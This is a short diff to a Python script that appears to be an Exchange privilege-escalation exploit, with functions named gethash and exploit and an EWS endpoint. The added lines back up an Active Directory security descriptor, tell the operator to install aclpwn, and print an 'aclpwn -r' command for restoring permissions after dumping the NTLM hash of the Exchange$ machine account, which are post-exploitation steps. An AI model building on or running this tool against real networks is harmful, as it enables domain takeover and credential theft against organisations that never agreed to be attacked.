@@ -159,6 +159,14 @@ def gethash(passargs):
         else:
             getpriv = config.get_priv()
 
+    restore = config.get_restore()
+    logging.critical("Backup old SD for restore => {}".format(restore))
+    logging.info("Install aclpwn with: pip install aclpwn")
+    logging.info(
+        "You can restore with aclpwn use this command below after dump the NTLM of Exhcange$")
+    logging.critical('Command: aclpwn -r {}'.format(restore))
+
+
 def exploit(args):
     ews_url = "/EWS/Exchange.asmx"
     exchange_version  = args.exchange_version
